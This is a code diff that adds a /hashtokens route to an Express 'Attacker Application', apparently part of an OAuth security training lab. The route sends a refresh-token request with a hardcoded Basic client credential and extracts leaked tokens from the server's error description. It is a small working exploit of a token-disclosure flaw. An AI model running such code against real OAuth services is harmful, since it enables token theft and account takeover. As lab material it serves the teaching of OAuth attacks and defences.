@@ -147,6 +147,30 @@ app.post('/exchangewithothercreds', async function(req, res){
   }
 });
 
+app.get('/hashtokens', async function(req, res){
+  options = {
+    'method':'post',
+    'headers':{
+      'content-type': 'application/x-www-form-urlencoded',
+      'Authorization': 'Basic cGhvdG9wcmludDpzZWNyZXQ=',
+    },
+    'url':gallery.oauth.auth.tokenHost + gallery.oauth.auth.tokenPath, 
+    'body':'grant_type=refresh_token&refresh_token=this.token'
+  };
+  try {
+    response = await makeRequest(options);
+    var obj = JSON.parse(response);
+    var tokensstr = obj.description.replace('You consumed the following refresh token: ','');
+    var tokens = JSON.parse(tokensstr);
+    console.log(tokens);
+    res.render('hashtokens', {tokens:tokens});
+
+  }catch (error) {
+    console.error(error);
+    res.status(500).render(error);
+  }
+});
+
 app.listen(1337, function () {
   console.log('Attacker Application listening on '+this.address().address +':'+this.address().port);
 });
